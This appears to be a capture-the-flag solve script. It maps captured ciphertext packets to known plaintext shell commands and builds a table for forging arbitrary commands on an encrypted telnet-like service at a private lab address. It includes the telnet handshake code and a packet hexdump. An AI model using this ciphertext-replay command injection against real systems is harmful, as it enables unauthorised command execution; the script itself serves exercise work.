from ptrlib import *
from time import sleep

packets = ['YiqMxpZQz+5dPf+qELowBw==', 'US5MJOeTx6L69iQT3Y8B9g==', '83jbJmmZc/RUXML8GcGuVg==', 'h8zZvECdaFr730Mgo5EgYQ==', 'YiqMxpZQz+5dPf+qELowBw==', 'RdGNIA97r2yYuQsdXjbQGA==', 'S+79/0xJH6oVAqvGSE+Vlw==', 'fgGU2dbDvV/tVy3pk1PL3RtH3cGz/iZONajZ8BEPWHGAAZQ+Bs5UKtAvX4sRr/obF/Qj+pV0Tk1VK4uGv9tR6rOdJj46ilT61DOaQS5qHqGeYoGtPHBzSyXCzjX0FUNJ1dK33psltMaeljuYxprLLDlbQVJOy5/2Rj0hUuX2Xu1eUrhcsOFVR8DM9BzYiVUtlA417iX2kt/NfiPW7VAE/G0uQUmytIL7l15biKcEsVgHHT4bgexQ4qiZLw75V3D4M/+rdhmEpXYXbNHmQFodAmRQAjYa4hYKi1oXvxaUcVMjgHTR3WncSYfRqij/K/bv0ucK4gjFcmCDfScYw6c5UA==', 'vCffRJyLzPpoDVYNvxEtoA==', 'RdGNIA97r2yYuQsdXjbQGA==', 'MufXoG4oKY+tLj7TNMzMtQ==', '9+fXRGjlf3TvpwR6XiqcSw==', '83jbJmmZc/RUXML8GcGuVg==', 'bIyEa1uO0qUPR+sBqjAJ8g==', '83jbJmmZc/RUXML8GcGuVg==', '0bGyNN1VKjWCxituvKDVvg==', '/Ks7iNV5tZaZT32Epav0CA==', 'KLVDOWDtxnck6THwQuPfGg==', 'L2/wiXcz7QQyFdbuDe14+w==', 'MufXoG4oKY+tLj7TNMzMtQ==', '/Ks7iNV5tZaZT32Epav0CA==', 'MC9KVKLGfFmxvdr6qNuZpA==', 'gCe+M22NmuwF6cPVKGGoZQ==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'wJNrzltAAb7rg/64niXZNg==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'S+79/0xJH6oVAqvGSE+Vlw==', '92fKIeYPq2HyqG8DSo2Mfw==', '9+fXRGjlf3TvpwR6XiqcSw==', 'XpjdNQ+r0XfWy25TW5lyAg==', '4iLXaYY1As8N9+wW+PVQOg==', '/Ks7iNV5tZaZT32Epav0CA==', '83jbJmmZc/RUXML8GcGuVg==', 'WSThaqht6loKlvNDraoarw==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'WSThaqht6loKlvNDraoarw==', '83jbJmmZc/RUXML8GcGuVg==', 'bIyEa1uO0qUPR+sBqjAJ8g==', 'bIyEa1uO0qUPR+sBqjAJ8g==', '83jbJmmZc/RUXML8GcGuVg==', '0bGyNN1VKjWCxituvKDVvg==', '/Ks7iNV5tZaZT32Epav0CA==', 'KLVDOWDtxnck6THwQuPfGg==', 'L2/wiXcz7QQyFdbuDe14+w==', 'MufXoG4oKY+tLj7TNMzMtQ==', '/Ks7iNV5tZaZT32Epav0CA==', 'MC9KVKLGfFmxvdr6qNuZpA==', 'gCe+M22NmuwF6cPVKGGoZQ==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'wJNrzltAAb7rg/64niXZNg==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'S+79/0xJH6oVAqvGSE+Vlw==', '92fKIeYPq2HyqG8DSo2Mfw==', '9+fXRGjlf3TvpwR6XiqcSw==', 'XpjdNQ+r0XfWy25TW5lyAg==', '4iLXaYY1As8N9+wW+PVQOg==', '/Ks7iNV5tZaZT32Epav0CA==', '83jbJmmZc/RUXML8GcGuVg==', 'WSThaqht6loKlvNDraoarw==', 'lwzGU75ZfX1C+vFQE1ahTQ==', 'US5MJOeTx6L69iQT3Y8B9g==', '83jbJmmZc/RUXML8GcGuVg==', 'h8zZvECdaFr730Mgo5EgYQ==', 'RdGNIA97r2yYuQsdXjbQGA==', 'mJoY/dqOlVLjsIzq/ZmGbg==', 'wJNrzltAAb7rg/64niXZNg==', 'WSThaqht6loKlvNDraoarw==', '83jbJmmZc/RUXML8GcGuVg==', 'bIyEa1uO0qUPR+sBqjAJ8g==', 'bIyEa1uO0qUPR+sBqjAJ8g==', '83jbJmmZc/RUXML8GcGuVg==', '0bGyNN1VKjWCxituvKDVvg==', '/Ks7iNV5tZaZT32Epav0CA==', 'KLVDOWDtxnck6THwQuPfGg==', 'L2/wiXcz7QQyFdbuDe14+w==', 'MufXoG4oKY+tLj7TNMzMtQ==', '/Ks7iNV5tZaZT32Epav0CA==', 'MC9KVKLGfFmxvdr6qNuZpA==', 'gCe+M22NmuwF6cPVKGGoZQ==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'wJNrzltAAb7rg/64niXZNg==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'S+79/0xJH6oVAqvGSE+Vlw==', '92fKIeYPq2HyqG8DSo2Mfw==', 'lwzGU75ZfX1C+vFQE1ahTQ==', 'US5MJOeTx6L69iQT3Y8B9g==', '83jbJmmZc/RUXML8GcGuVg==', 'h8zZvECdaFr730Mgo5EgYQ==', 'RdGNIA97r2yYuQsdXjbQGA==', 'mJoY/dqOlVLjsIzq/ZmGbg==', 'wJNrzltAAb7rg/64niXZNg==', '83jbJmmZc/RUXML8GcGuVg==', 'bIyEa1uO0qUPR+sBqjAJ8g==', 'bIyEa1uO0qUPR+sBqjAJ8g==', '83jbJmmZc/RUXML8GcGuVg==', '0bGyNN1VKjWCxituvKDVvg==', '/Ks7iNV5tZaZT32Epav0CA==', 'KLVDOWDtxnck6THwQuPfGg==', 'L2/wiXcz7QQyFdbuDe14+w==', 'MufXoG4oKY+tLj7TNMzMtQ==', '/Ks7iNV5tZaZT32Epav0CA==', 'MC9KVKLGfFmxvdr6qNuZpA==', 'gCe+M22NmuwF6cPVKGGoZQ==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'wJNrzltAAb7rg/64niXZNg==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'S+79/0xJH6oVAqvGSE+Vlw==', '92fKIeYPq2HyqG8DSo2Mfw==', '9+fXRGjlf3TvpwR6XiqcSw==', 'XpjdNQ+r0XfWy25TW5lyAg==', '4iLXaYY1As8N9+wW+PVQOg==', '/Ks7iNV5tZaZT32Epav0CA==', '83jbJmmZc/RUXML8GcGuVg==', 'WSThaqht6loKlvNDraoarw==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'Tkb8E728rfsc+V1i5HtOzQ==', 'WSThaqht6loKlvNDraoarw==', '83jbJmmZc/RUXML8GcGuVg==', 'bIyEa1uO0qUPR+sBqjAJ8g==', 'bIyEa1uO0qUPR+sBqjAJ8g==', '83jbJmmZc/RUXML8GcGuVg==', '0bGyNN1VKjWCxituvKDVvg==', '/Ks7iNV5tZaZT32Epav0CA==', 'KLVDOWDtxnck6THwQuPfGg==', 'L2/wiXcz7QQyFdbuDe14+w==', 'MufXoG4oKY+tLj7TNMzMtQ==', '/Ks7iNV5tZaZT32Epav0CA==', 'MC9KVKLGfFmxvdr6qNuZpA==', 'gCe+M22NmuwF6cPVKGGoZQ==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'wJNrzltAAb7rg/64niXZNg==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'S+79/0xJH6oVAqvGSE+Vlw==', '92fKIeYPq2HyqG8DSo2Mfw==', '9+fXRGjlf3TvpwR6XiqcSw==', 'XpjdNQ+r0XfWy25TW5lyAg==', '4iLXaYY1As8N9+wW+PVQOg==', '/Ks7iNV5tZaZT32Epav0CA==', '83jbJmmZc/RUXML8GcGuVg==', 'WSThaqht6loKlvNDraoarw==', 'vCffRJyLzPpoDVYNvxEtoA==', 'qgZnSf9/KcpMFM90/ZaklQ==', '83jbJmmZc/RUXML8GcGuVg==', 'h8zZvECdaFr730Mgo5EgYQ==', '4iLXaYY1As8N9+wW+PVQOg==', 'WSThaqht6loKlvNDraoarw==', '83jbJmmZc/RUXML8GcGuVg==', 'bIyEa1uO0qUPR+sBqjAJ8g==', 'bIyEa1uO0qUPR+sBqjAJ8g==', '83jbJmmZc/RUXML8GcGuVg==', '0bGyNN1VKjWCxituvKDVvg==', '/Ks7iNV5tZaZT32Epav0CA==', 'KLVDOWDtxnck6THwQuPfGg==', 'L2/wiXcz7QQyFdbuDe14+w==', 'MufXoG4oKY+tLj7TNMzMtQ==', '/Ks7iNV5tZaZT32Epav0CA==', 'MC9KVKLGfFmxvdr6qNuZpA==', 'gCe+M22NmuwF6cPVKGGoZQ==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'wJNrzltAAb7rg/64niXZNg==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'S+79/0xJH6oVAqvGSE+Vlw==', '92fKIeYPq2HyqG8DSo2Mfw==', 'vCffRJyLzPpoDVYNvxEtoA==', 'qgZnSf9/KcpMFM90/ZaklQ==', '83jbJmmZc/RUXML8GcGuVg==', 'h8zZvECdaFr730Mgo5EgYQ==', '4iLXaYY1As8N9+wW+PVQOg==', '83jbJmmZc/RUXML8GcGuVg==', 'bIyEa1uO0qUPR+sBqjAJ8g==', 'bIyEa1uO0qUPR+sBqjAJ8g==', '83jbJmmZc/RUXML8GcGuVg==', '0bGyNN1VKjWCxituvKDVvg==', '/Ks7iNV5tZaZT32Epav0CA==', 'KLVDOWDtxnck6THwQuPfGg==', 'L2/wiXcz7QQyFdbuDe14+w==', 'MufXoG4oKY+tLj7TNMzMtQ==', '/Ks7iNV5tZaZT32Epav0CA==', 'MC9KVKLGfFmxvdr6qNuZpA==', 'gCe+M22NmuwF6cPVKGGoZQ==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'wJNrzltAAb7rg/64niXZNg==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'S+79/0xJH6oVAqvGSE+Vlw==', '92fKIeYPq2HyqG8DSo2Mfw==', 'XpjdNQ+r0XfWy25TW5lyAg==', 'lwzGU75ZfX1C+vFQE1ahTQ==', '83jbJmmZc/RUXML8GcGuVg==', 'gCe+M22NmuwF6cPVKGGoZQ==', 'pxsE18FW3UofpVPzG1RchA==', '0bGyNN1VKjWCxituvKDVvg==', '/Ks7iNV5tZaZT32Epav0CA==', 'KLVDOWDtxnck6THwQuPfGg==', 'L2/wiXcz7QQyFdbuDe14+w==', 'MufXoG4oKY+tLj7TNMzMtQ==', '/Ks7iNV5tZaZT32Epav0CA==', 'MC9KVKLGfFmxvdr6qNuZpA==', 'gCe+M22NmuwF6cPVKGGoZQ==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'wJNrzltAAb7rg/64niXZNg==', 'MufXoG4oKY+tLj7TNMzMtQ==', '83jbJmmZc/RUXML8GcGuVg==', 'pxsE18FW3UofpVPzG1RchA==', 'YiqMxpZQz+5dPf+qELowBw==', '/Ks7iNV5tZaZT32Epav0CA==', 'lwA3zobBmueRmJyafjFH9A==', 'US5MJOeTx6L69iQT3Y8B9g==', 'S+79/0xJH6oVAqvGSE+Vlw==', '92fKIeYPq2HyqG8DSo2Mfw==', '9+fXRGjlf3TvpwR6XiqcSw==', 'wJNrzltAAb7rg/64niXZNg==', 'L2/wiXcz7QQyFdbuDe14+w==', 'MufXoG4oKY+tLj7TNMzMtQ==', 'S+79/0xJH6oVAqvGSE+Vlw==']

commands = """ls -la
date > monitor.txt
echo "=========================================" >> monitor.txt
echo "ps -aux" >> monitor.txt
ps -aux >> monitor.txt
echo "=========================================" >> monitor.txt
echo "df -h" >> monitor.txt
df -h >> monitor.txt
cp ./monitor.txt /logs
exit"""
commands = commands.replace("\n", "\r\n")

table = {}

for i in range(len(commands)):
    c = commands[i]
    data = packets[i]
    if c in table:
        assert table[c] == data
    elif len(data) < 64:
        table[c] = data

table['0'] = "Di3aURm6+K0mG9hso7VN0Q=="

#scr = 'printf "printf a" > x\r\n'
scr = input().strip() + '\r\n'
exp = ""
for c in scr:
    if c in table:
        exp += table[c]
    else:
        print("You can't use the character!: '{}'".format(c))
print(exp)
exit(0)

""" Initialize """
sock = Socket("172.30.0.2", 6023)

# Stage 0
assert sock.recv(3) == b'\xff\xfd\x18'
sock.send("\xff\xfb\x18")
# Stage 1
assert sock.recv(6) == b'\xff\xfa\x18\x01\xff\xf0'
assert sock.recv(3) == b'\xff\xfb\x03'
assert sock.recv(3) == b'\xff\xfb\x01'
assert sock.recv(3) == b'\xff\xfb\x00'
assert sock.recv(3) == b'\xff\xfd\x27'
assert sock.recv(3) == b'\xff\xfd\x1f'
assert sock.recv(3) == b'\xff\xfd\x2a'
sock.send("\xff\xfa\x18\x00unknown\xff\xf0")
sleep(0.05)
sock.send("\xff\xfd\x03")
sleep(0.05)
sock.send("\xff\xfd\x01")
sleep(0.05)
sock.send("\xff\xfd\x00")
sleep(0.05)
sock.send("\xff\xfb\x27")
sleep(0.05)
sock.send("\xff\xfb\x1f")
sleep(0.05)
sock.send("\xff\xfa\x1f\x00\x50\x00\x19\xff\xf0")
sleep(0.05)
sock.send("\xff\xfb\x2a")
sleep(0.05)
# Stage 2
assert sock.recv(6) == b'\xff\xfa\x18\x01\xff\xf0'
dump(sock.recv(0x28))
assert sock.recv(3) == b'\xff\xfd\x00'
dump(sock.recv((0x20c - 0x4c) + 1))
sock.send("\xff\xfa\x27\x00\x00LANG\x01en_US.utf8\x00TERM\x01unknown\x00COLUMNS\x0180\x00LINES\x0125\x00DISPLAY\x01\x00\x01\xff\xf0")
sock.send("\xff\xfb\x00")
sock.send("\xff\xfa\x2a\x02UTF-8\xff\xf0")


sock.send("YiqMxpZQ z+5dPf+qELowBw==")
print(sock.recv())

"""
00000010  ff fd 03 ff fd 01 ff fd  00 ff fb 27 ff fb 1f ff ........ ...'....
00000020  fa 1f 00 50 00 19 ff f0  ff fb 2a                ...P.... ..*
    00000021  ff fa 27 01 00 4c 41 4e  47 00 54 45 52 4d 00 43 ..'..LAN G.TERM.C
    00000031  4f 4c 55 4d 4e 53 00 4c  49 4e 45 53 00 44 49 53 OLUMNS.L INES.DIS
    00000041  50 4c 41 59 00 03 ff f0                          PLAY.... 
    00000049  ff fa 2a 01 20 55 54 46  2d 38 20 55 54 46 2d 31 ..*. UTF -8 UTF-1
    00000059  36 20 4c 41 54 49 4e 31  20 55 53 2d 41 53 43 49 6 LATIN1  US-ASCI
    00000069  49 20 42 49 47 35 20 47  42 4b 20 53 48 49 46 54 I BIG5 G BK SHIFT
    00000079  4a 49 53 20 47 42 31 38  30 33 30 20 4b 4f 49 38 JIS GB18 030 KOI8
    00000089  2d 52 20 4b 4f 49 38 2d  55 20 49 53 4f 38 38 35 -R KOI8- U ISO885
    00000099  39 2d 31 20 49 53 4f 38  38 35 39 2d 32 20 49 53 9-1 ISO8 859-2 IS
    000000A9  4f 38 38 35 39 2d 33 20  49 53 4f 38 38 35 39 2d O8859-3  ISO8859-
    000000B9  34 20 49 53 4f 38 38 35  39 2d 35 20 49 53 4f 38 4 ISO885 9-5 ISO8
    000000C9  38 35 39 2d 36 20 49 53  4f 38 38 35 39 2d 37 20 859-6 IS O8859-7 
    000000D9  49 53 4f 38 38 35 39 2d  38 20 49 53 4f 38 38 35 ISO8859- 8 ISO885
    000000E9  39 2d 39 20 49 53 4f 38  38 35 39 2d 31 30 20 49 9-9 ISO8 859-10 I
    000000F9  53 4f 38 38 35 39 2d 31  31 20 49 53 4f 38 38 35 SO8859-1 1 ISO885
    00000109  39 2d 31 33 20 49 53 4f  38 38 35 39 2d 31 34 20 9-13 ISO 8859-14 
    00000119  49 53 4f 38 38 35 39 2d  31 35 20 43 50 31 35 34 ISO8859- 15 CP154
    00000129  20 43 50 34 33 37 20 43  50 35 30 30 20 43 50 37  CP437 C P500 CP7
    00000139  33 37 20 43 50 37 37 35  20 43 50 38 35 30 20 43 37 CP775  CP850 C
    00000149  50 38 35 32 20 43 50 38  35 35 20 43 50 38 35 36 P852 CP8 55 CP856
    00000159  20 43 50 38 35 37 20 43  50 38 36 30 20 43 50 38  CP857 C P860 CP8
    00000169  36 31 20 43 50 38 36 32  20 43 50 38 36 33 20 43 61 CP862  CP863 C
    00000179  50 38 36 34 20 43 50 38  36 35 20 43 50 38 36 36 P864 CP8 65 CP866
    00000189  20 43 50 38 36 39 20 43  50 38 37 34 20 43 50 38  CP869 C P874 CP8
    00000199  37 35 20 43 50 39 33 32  20 43 50 39 34 39 20 43 75 CP932  CP949 C
    000001A9  50 39 35 30 20 43 50 31  30 30 36 20 43 50 31 30 P950 CP1 006 CP10
    000001B9  32 36 20 43 50 31 31 34  30 20 43 50 31 32 35 30 26 CP114 0 CP1250
    000001C9  20 43 50 31 32 35 31 20  43 50 31 32 35 32 20 43  CP1251  CP1252 C
    000001D9  50 31 32 35 33 20 43 50  31 32 35 34 20 43 50 31 P1253 CP 1254 CP1
    000001E9  32 35 35 20 43 50 31 32  35 37 20 43 50 31 32 35 255 CP12 57 CP125
    000001F9  37 20 43 50 31 32 35 38  20 43 50 31 33 36 31 ff 7 CP1258  CP1361.
    00000209  f0                                               .
    0000020A  ff fd 00                                         ...
0000002B  ff fa 27 00 00 4c 41 4e  47 01 65 6e 5f 55 53 2e ..'..LAN G.en_US.
0000003B  75 74 66 38 00 54 45 52  4d 01 75 6e 6b 6e 6f 77 utf8.TER M.unknow
0000004B  6e 00 43 4f 4c 55 4d 4e  53 01 38 30 00 4c 49 4e n.COLUMN S.80.LIN
0000005B  45 53 01 32 35 00 44 49  53 50 4c 41 59 01 00 01 ES.25.DI SPLAY...
0000006B  ff f0                                            ..
0000006D  ff f0 ff fa 2a 02 55 54  46 2d 38 ff fb 00 ff f0 ....*.UT F-8.....
0000007D  59 69 71 4d 78 70 5a 51  20 7a 2b 35 64 50 66 2b YiqMxpZQ  z+5dPf+
0000008D  71 45 4c 6f 77 42 77 3d  3d                      qELowBw= =
"""

